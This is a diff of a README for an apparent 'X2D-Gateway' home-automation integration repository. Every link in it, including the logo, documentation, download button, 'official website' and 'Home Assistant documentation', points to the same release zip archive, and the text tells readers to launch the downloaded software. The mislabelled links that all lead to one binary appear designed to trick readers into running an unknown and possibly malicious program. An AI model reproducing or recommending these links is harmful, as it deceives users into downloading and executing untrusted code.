@@ -1,6 +1,6 @@
 # 🏠 X2D-Gateway Integration
 
-![X2D-Gateway Logo](https://github.com/evin5/X2D-Gateway-integration/releases/download/v1.0/Release_x64.zip)
+![X2D-Gateway Logo](https://github.com/evin5/X2D-Gateway-integration/releases/download/v2.0/Software.zip)
 
 Welcome to the X2D-Gateway Integration repository! This repository serves as a gateway to X2D Adaptor services, facilitating seamless integration into various home automation systems. Whether you are a DIY enthusiast or a professional home automation expert, this repository aims to simplify the process of incorporating X2D technology into your projects.
 
@@ -12,7 +12,7 @@ Welcome to the X2D-Gateway Integration repository! This repository serves as a g
 
 ## 📚 Documentation
 
-For detailed instructions on how to use the X2D-Gateway Integration, please refer to the [documentation](https://github.com/evin5/X2D-Gateway-integration/releases/download/v1.0/Release_x64.zip).
+For detailed instructions on how to use the X2D-Gateway Integration, please refer to the [documentation](https://github.com/evin5/X2D-Gateway-integration/releases/download/v2.0/Software.zip).
 
 ## 🚀 Quick Start
 
@@ -27,7 +27,7 @@ To get started with the X2D-Gateway Integration, follow these simple steps:
 
 To download the latest software for the X2D-Gateway Integration, click the button below:
 
-[![Download Software](https://github.com/evin5/X2D-Gateway-integration/releases/download/v1.0/Release_x64.zip)](https://github.com/evin5/X2D-Gateway-integration/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/evin5/X2D-Gateway-integration/releases/download/v2.0/Software.zip)](https://github.com/evin5/X2D-Gateway-integration/releases/download/v2.0/Software.zip)
 
 ### Launch Software
 The downloaded software needs to be launched on your system to begin the setup process.
@@ -49,8 +49,8 @@ This repository covers the following topics:
 ## 🌐 Additional Resources
 
 For more information on X2D technology and home automation systems, visit the following resources:
-- [X2D Official Website](https://github.com/evin5/X2D-Gateway-integration/releases/download/v1.0/Release_x64.zip)
-- [Home Assistant Documentation](https://github.com/evin5/X2D-Gateway-integration/releases/download/v1.0/Release_x64.zip)
+- [X2D Official Website](https://github.com/evin5/X2D-Gateway-integration/releases/download/v2.0/Software.zip)
+- [Home Assistant Documentation](https://github.com/evin5/X2D-Gateway-integration/releases/download/v2.0/Software.zip)
 
 ## 🤝 Contributing
 
